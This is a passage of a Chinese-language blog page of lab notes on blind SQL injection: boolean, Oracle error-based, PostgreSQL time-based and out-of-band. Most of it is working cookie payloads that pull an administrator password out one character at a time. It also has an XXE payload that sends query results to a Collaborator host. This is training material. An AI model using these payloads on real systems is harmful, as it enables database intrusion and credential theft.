+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT &#39;&#39;)||&#39;</span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;(SELECT &#39;&#39;)&#39;</span>
+</span></span></code></pre></div><h2 id="oracle特有关键字和函数">Oracle特有关键字和函数</h2>
+<ul>
+<li>
+<p><code>ROWNUM</code>,限制查询的行数</p>
+<p>等同于MySQL的<code>limit</code></p>
+</li>
+<li>
+<p><code>to_char()</code></p>
+<p>将数值型或者日期型转化为字符型</p>
+<blockquote>
+<p>1/0是必须加这个函数</p>
+</blockquote>
+</li>
+<li>
+<p><code>SUBSTR(PASSWORD,1,1)</code></p>
+<p>等同于Mysql中的SUBSTRING()函数</p>
+<blockquote>
+<p>截取字符串，从第一个位置截取长度为1的字符串</p>
+</blockquote>
+</li>
+</ul>
+<h1 id="盲注">盲注</h1>
+<h2 id="t11布尔注入">T11布尔注入</h2>
+<blockquote>
+<p>正确会返回welcome back，但错误时不会回显任何东西，只会和原页面无异。</p>
+<p>正确和错误都是200。</p>
+</blockquote>
+<p>本例中注入点在cookie，抓包获得，判断是否可注,此处因为是字符变量，所以注入写成字符型</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>skltCt9gC13tASAk<span style="color:#e6db74">&#39; AND &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=1
+</span></span></span></code></pre></div><p>判断是否存在user表和username=‘administrator’的一行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>skltCt9gC13tASAk<span style="color:#e6db74">&#39; and (SELECT &#39;</span>A<span style="color:#e6db74">&#39; FROM users WHERE username=&#39;</span>administrator<span style="color:#e6db74">&#39;)=&#39;</span>A
+</span></span></code></pre></div><p>attack出密码长度，发现是20位</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>skltCt9gC13tASAk<span style="color:#e6db74">&#39; AND ( select &#39;</span>a<span style="color:#e6db74">&#39; from users where username=&#39;</span>administrator<span style="color:#e6db74">&#39; AND LENGTH(password)&gt;§1§)=&#39;</span>a
+</span></span></code></pre></div><ul>
+<li>
+<p>要知道这里的where后面的and前后的东西是一起的，都是对于select的限制，而不是and相连的布尔判断式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">LENGTH</span>(password)<span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">§</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">§</span>
+</span></span></code></pre></div></li>
+<li>
+<p>为什么intruder后length不同就能判断出密码的长度？</p>
+<p><img src="images/image-20221121092517763.png" alt="image-20221121092517763"></p>
+<p>因为这里的length代表的是<strong>反应时长</strong>，因为<strong>密码正确和错误所反应的时间是不同的</strong>。</p>
+</li>
+</ul>
+<p>然后继续爆出密码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>skltCt9gC13tASAk<span style="color:#e6db74">&#39; AND (select SUBSTRING(password,$1$,1) from users where username=&#39;</span>administrator<span style="color:#e6db74">&#39;)=&#39;</span><span style="color:#960050;background-color:#1e0010">$</span>a$
+</span></span></code></pre></div><h2 id="t12报错盲注">T12报错盲注</h2>
+<h3 id="方法一利用oraclepostgresql数据库优先考虑此方法">方法一：利用<code>||</code>(Oracle、PostgreSQL数据库优先考虑此方法)</h3>
+<p>==首次卡在管道的逻辑理解上==</p>
+<p><strong>本题是Oracle数据库</strong></p>
+<blockquote>
+<p>直接错误（sql语句错误）时或者正确时都不会返回任何东西。</p>
+<p>只有当输入语句本身错误（sql语法错误）（比如1/0）时才会报错。故可以利用此倒推</p>
+<p>正确和错误都是200，但报错是500</p>
+</blockquote>
+<p>在注入点cookie判断是否可用报错注入（即是否对语法错误敏感）:</p>
+<ul>
+<li>方法一：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">正确</span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39; #错误
+</span></span></span></code></pre></div><ul>
+<li>方法二：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM dual)||&#39;</span> <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">返回错误</span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM dual)||&#39;</span> <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">返回正确</span>
+</span></span></code></pre></div><p>然后运用<code>||</code>,并且确定是Oracle数据库：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT &#39;&#39; FROM dual)||&#39;</span> <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">正确</span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT &#39;&#39;)||&#39;</span> <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">错误</span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT &#39;&#39; FROM not-a-real-table)||&#39;</span> <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">查一个不存在的表，返回错误，确定这个点能注</span>
+</span></span></code></pre></div><p>确定想要查的表是否存在和想要查的用户名是否存在：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT &#39;&#39; FROM users WHERE ROWNUM = 1)||&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">有</span>ROWNUM限制是因为<span style="color:#960050;background-color:#1e0010">，用</span><span style="color:#f92672">||</span><span style="color:#960050;background-color:#1e0010">的前后</span>select语句必须是返回的相同行
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;</span>administrator<span style="color:#e6db74">&#39;)||&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">确定是否有</span>administrator用户名
+</span></span></code></pre></div><p>确定密码长度：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;</span>administrator<span style="color:#e6db74">&#39;)||&#39;</span>
+</span></span></code></pre></div><p>确定密码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#39;</span>a<span style="color:#e6db74">&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;</span>administrator<span style="color:#e6db74">&#39;)||&#39;</span>
+</span></span></code></pre></div><h3 id="方法二利用and">方法二：利用<code>and</code></h3>
+<p>确定了是Oracle数据库：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>LKhHSsm70t3BWS33<span style="color:#e6db74">&#39; and (SELECT &#39;</span>a<span style="color:#e6db74">&#39; FROM dual)=&#39;</span>a<span style="color:#75715e">-- #返回200
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>TrackingId<span style="color:#f92672">=</span>LKhHSsm70t3BWS33<span style="color:#e6db74">&#39; and (SELECT &#39;</span>a<span style="color:#e6db74">&#39;)=&#39;</span>a<span style="color:#75715e">-- #返回500
+</span></span></span></code></pre></div><p>判断是否存在语法错误的两种方法,判断结果为存在：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">因为是</span>Oracle数据库<span style="color:#960050;background-color:#1e0010">，所以必须</span><span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">时有</span>to_char()<span style="color:#960050;background-color:#1e0010">函数女，且要有</span> <span style="color:#66d9ef">from</span> dual
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>LKhHSsm70t3BWS33<span style="color:#e6db74">&#39; and (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#39;</span>a<span style="color:#e6db74">&#39; END FROM dual)=&#39;</span>a<span style="color:#75715e">--  #返回200
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>TrackingId<span style="color:#f92672">=</span>LKhHSsm70t3BWS33<span style="color:#e6db74">&#39; and (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#39;</span>a<span style="color:#e6db74">&#39; END FROM dual)=&#39;</span>a<span style="color:#75715e">--   #返回500
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">正确</span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39; #错误
+</span></span></span></code></pre></div><p>确定是否有users表和user=administrator的用户：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>LKhHSsm70t3BWS33<span style="color:#e6db74">&#39; and (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#39;</span>a<span style="color:#e6db74">&#39; END FROM users where username=&#39;</span>administrator<span style="color:#e6db74">&#39;)=&#39;</span>a<span style="color:#75715e">-- 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">返回</span><span style="color:#ae81ff">200</span><span style="color:#960050;background-color:#1e0010">，说明有</span>
+</span></span></code></pre></div><p>确定密码位数，为20位：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>LKhHSsm70t3BWS33<span style="color:#e6db74">&#39; and (SELECT CASE when LENGTH(password)&gt;§1§ THEN TO_CHAR(1/0) ELSE &#39;</span>a<span style="color:#e6db74">&#39; END FROM users where username=&#39;</span>administrator<span style="color:#e6db74">&#39;)=&#39;</span>a<span style="color:#75715e">--
+</span></span></span></code></pre></div><p>确定密码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">爆失败</span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>LKhHSsm70t3BWS33<span style="color:#e6db74">&#39; and (SELECT CASE when (1=2) THEN TO_CHAR(1/0) ELSE SUBSTR(PASSWORD,§1§,1) END FROM users where username=&#39;</span>administrator<span style="color:#e6db74">&#39;)=&#39;</span><span style="color:#960050;background-color:#1e0010">§</span>a<span style="color:#960050;background-color:#1e0010">§</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">爆成功</span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>xyz<span style="color:#e6db74">&#39;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#39;</span>a<span style="color:#e6db74">&#39; THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM users WHERE username=&#39;</span>administrator<span style="color:#e6db74">&#39;)||&#39;</span>
+</span></span></code></pre></div><p>==汲取经验：==</p>
+<blockquote>
+<p>爆失败是因为：</p>
+<p><strong><code>CASE..WHEN..THEN..ELSE</code>逻辑问题</strong></p>
+<blockquote>
+<p>语法正确和语法错误的两种情况并没有在Intruder中都用到(这样就会使得全都返回200，bp中就看不出来了所以也谨记，<strong>bp密码爆破的原理是返回的状态不一样</strong>)。即<strong>并没有在所有情况的爆破中出现<code>THEN...ELSE...</code>两边的情况。</strong></p>
+<p>即<strong>我们的密码判断是否是某个字符的表达式应该在<code>SELECT CASE WHEN</code>后面</strong></p>
+</blockquote>
+</blockquote>
+<p>改进，爆密码，爆成功！：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>LKhHSsm70t3BWS33<span style="color:#e6db74">&#39; and (SELECT CASE when SUBSTR(PASSWORD,§1§,1)=&#39;</span><span style="color:#960050;background-color:#1e0010">§</span>a<span style="color:#960050;background-color:#1e0010">§</span><span style="color:#e6db74">&#39; THEN TO_CHAR(1/0) ELSE &#39;</span>A<span style="color:#e6db74">&#39; END FROM users where username=&#39;</span>administrator<span style="color:#e6db74">&#39;)=&#39;</span>A<span style="color:#75715e">--
+</span></span></span></code></pre></div><h2 id="t13-时间盲注">T13 时间盲注</h2>
+<h4 id="坑url编码">坑：URL编码</h4>
+<p><code>%3B</code>=<code>;</code></p>
+<p><strong>但有的时候语句中有<code>;</code>不可以，但有<code>%3B</code>可以</strong>，所以语句注入没有效果时，应该考虑将语句中的所有符号或者空格全都转换成URL编码格式。</p>
+<p>猜测是因为：有的浏览器本身没有自带转换URL编码的功能。</p>
+<h4 id="postgresql数据库">PostgreSQL数据库</h4>
+<blockquote>
+<p>检查是否有时间盲注的漏洞。</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">方法一：</span>
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span>x<span style="color:#e6db74">&#39;||pg_sleep(10)--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#方法二：
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span>;<span style="color:#66d9ef">select</span> pg_sleep(<span style="color:#ae81ff">10</span>)<span style="color:#75715e">--堆叠注入
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39; union select 1,2,pg_sleep(10)--或者和union结合在一起，需要预先知道列数
+</span></span></span></code></pre></div><blockquote>
+<p>用测试的布尔条件来确认是否有时间盲注漏洞</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>eM6rdiubc194K4O<span style="color:#e6db74">&#39;%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+</span></span></span></code></pre></div><blockquote>
+<p>测试是否有这一个数据</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#f92672">#</span><span style="color:#960050;background-color:#1e0010">如何在</span><span style="color:#66d9ef">case</span> <span style="color:#66d9ef">when</span> <span style="color:#66d9ef">then</span> else中加入列名
+</span></span><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>eM6rdiubc194K4O<span style="color:#e6db74">&#39;%3BSELECT CASE WHEN (username=&#39;</span>administrator<span style="color:#e6db74">&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END  from users--
+</span></span></span></code></pre></div><blockquote>
+<p>爆密码长度，为20</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>eM6rdiubc194K4O<span style="color:#e6db74">&#39;%3BSELECT CASE WHEN (username=&#39;</span>administrator<span style="color:#e6db74">&#39; AND length(password)&gt;1) THEN pg_sleep(10) ELSE pg_sleep(0) END  from users--
+</span></span></span></code></pre></div><blockquote>
+<p>爆出密码</p>
+<p>建议时间注入的爆密码一个一个爆</p>
+<p>如果要看返回的时长：To see it, go to the &ldquo;Columns&rdquo; menu, and check the box for &ldquo;Response received&rdquo;</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span>TrackingId<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>eM6rdiubc194K4O<span style="color:#e6db74">&#39;%3BSELECT CASE WHEN (username=&#39;</span>administrator<span style="color:#e6db74">&#39; AND substring(password,1,1)=&#39;</span>a<span style="color:#e6db74">&#39;) THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
+</span></span></span></code></pre></div><p><code>32wja67xqtddkxtz45o2</code></p>
+<h2 id="t14-oast盲注">T14 OAST盲注</h2>
+<h4 id="oracle">Oracle</h4>
+<ul>
+<li>
+<p><code>extractvalue(目标XML文档，XML路径)</code>对XML文档进行查询的函数。</p>
+</li>
+<li>
+<p><code>xmltype()</code>在Oracle 10g中是作为专门的保存XML格式</p>
+</li>
+<li>
+<p>一般注入样例</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> EXTRACTVALUE(xmltype(<span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &#34;http://&#39;</span><span style="color:#f92672">||</span>(<span style="color:#66d9ef">SELECT</span> YOUR<span style="color:#f92672">-</span>QUERY<span style="color:#f92672">-</span>HERE)<span style="color:#f92672">||</span><span style="color:#e6db74">&#39;.BURP-COLLABORATOR-SUBDOMAIN/&#34;&gt; %remote;]&gt;&#39;</span>),<span style="color:#e6db74">&#39;/l&#39;</span>) 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> dual
+</span></span></code></pre></div><p>本题payload：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-SQL" data-lang="SQL"><span style="display:flex;"><span><span style="color:#e6db74">&#39;+UNION+SELECT+EXTRACTVALUE(xmltype(&#39;</span><span style="color:#f92672">&lt;%</span><span style="color:#ae81ff">3</span>fxml<span style="color:#f92672">+</span><span style="color:#66d9ef">version</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>d<span style="color:#e6db74">&#34;1.0&#34;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">encoding</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>d<span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>f<span style="color:#f92672">&gt;&lt;!</span>DOCTYPE<span style="color:#f92672">+</span>root<span style="color:#f92672">+</span>[<span style="color:#f92672">+&lt;!</span>ENTITY<span style="color:#f92672">+%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">+</span>remote<span style="color:#f92672">+</span><span style="color:#66d9ef">SYSTEM</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;http%3a//BURP-COLLABORATOR-SUBDOMAIN/&#34;</span><span style="color:#f92672">&gt;+%</span><span style="color:#ae81ff">25</span>remote<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>b]<span style="color:#f92672">&gt;</span><span style="color:#e6db74">&#39;),&#39;</span><span style="color:#f92672">/</span>l<span style="color:#e6db74">&#39;)+FROM+dual--
+</span></span></span></code></pre></div></li>
+</ul>
+<ul class="pa0">
+  
+   <li class="list di">
+     <a href="/tags/SQL%E6%B3%A8%E5%85%A5.html" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">SQL注入</a>
+   </li>
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+  <div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
+    <p class="f5 b mb3">相关內容</p>
+    <ul class="pa0 list">
+	   
+	     <li  class="mb2">
+          <a href="/post/SQL%E6%B3%A8%E5%85%A5/MySQL%E5%AE%9E%E6%93%8D.html">MySQL实操</a>
+        </li>
+	    
+	     <li  class="mb2">
+          <a href="/post/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5.html">SQL注入</a>
+        </li>
+	    
+    </ul>
+</div>
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://aiguamumu.github.io/" >
+    &copy;  Web_Security 2022 
+  </a>
+    <div>
+<div class="ananke-socials">
+  
+    <a href="https://twitter.com/GoHugoIO" target="_blank" class="twitter ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;"/></svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
